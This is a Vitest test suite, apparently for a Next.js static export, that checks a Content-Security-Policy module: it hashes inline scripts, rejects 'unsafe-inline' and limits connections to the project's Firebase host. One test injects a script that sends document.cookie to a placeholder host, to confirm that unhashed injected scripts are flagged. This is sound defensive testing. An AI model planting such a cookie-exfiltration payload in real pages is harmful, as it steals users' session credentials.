import { describe, expect, it } from "vitest";

import {
  applyContentSecurityPolicy,
  contentSecurityPolicy,
  contentSecurityPolicyProblems,
  inlineScripts,
  scriptHash,
} from "./csp.mjs";

const page = [
  "<!DOCTYPE html><html><head><meta charSet=\"utf-8\"/>",
  "<script>(function(){document.documentElement.classList.toggle('dark',true)})();</script>",
  "<script src=\"/_next/static/chunks/app.js\" async></script>",
  "</head><body><script>self.__next_f.push([1,\"payload\"])</script>",
  "<script type=\"application/json\">{\"dado\":true}</script></body></html>",
].join("");
const options = { projectId: "atendo-teste", authDomain: "atendo-teste.firebaseapp.com" };

describe("CSP do export estatico", () => {
  it("considera so scripts inline executaveis", () => {
    expect(inlineScripts(page)).toHaveLength(2);
  });

  it("pagina sem politica e reprovada", () => {
    expect(contentSecurityPolicyProblems(page)).toEqual(["sem Content-Security-Policy"]);
  });

  it("grava a politica antes dos scripts, com o hash de cada script inline", () => {
    const published = applyContentSecurityPolicy(page, options);

    expect(contentSecurityPolicyProblems(published)).toEqual([]);
    for (const content of inlineScripts(page)) expect(published).toContain(scriptHash(content));
    expect(published.indexOf("Content-Security-Policy")).toBeLessThan(published.indexOf("<script"));
    // Reaplicar nao duplica a politica.
    expect(applyContentSecurityPolicy(published, options).match(/Content-Security-Policy/g)).toHaveLength(1);
  });

  it("script injetado depois da publicacao nao tem hash e e apontado", () => {
    const published = applyContentSecurityPolicy(page, options);
    const injected = published.replace("</body>", "<script>fetch('https://exemplo.invalido/?c='+document.cookie)</script></body>");

    expect(contentSecurityPolicyProblems(injected)).toContain("script inline sem hash na CSP");
  });

  it("recusa politica que libera execucao inline", () => {
    const loose = page.replace("<head>", "<head><meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self' 'unsafe-inline'\"/>");
    expect(contentSecurityPolicyProblems(loose)).toContain("script-src permite execucao inline");
  });

  it("restringe conexoes ao Firebase do projeto, sem curinga", () => {
    const policy = contentSecurityPolicy({ scriptHashes: [], ...options });
    const connect = policy.split("; ").find((part) => part.startsWith("connect-src"));

    expect(connect).toContain("https://southamerica-east1-atendo-teste.cloudfunctions.net");
    expect(connect).not.toMatch(/\*|stripe/);
    expect(policy).toContain("object-src 'none'");
  });
});
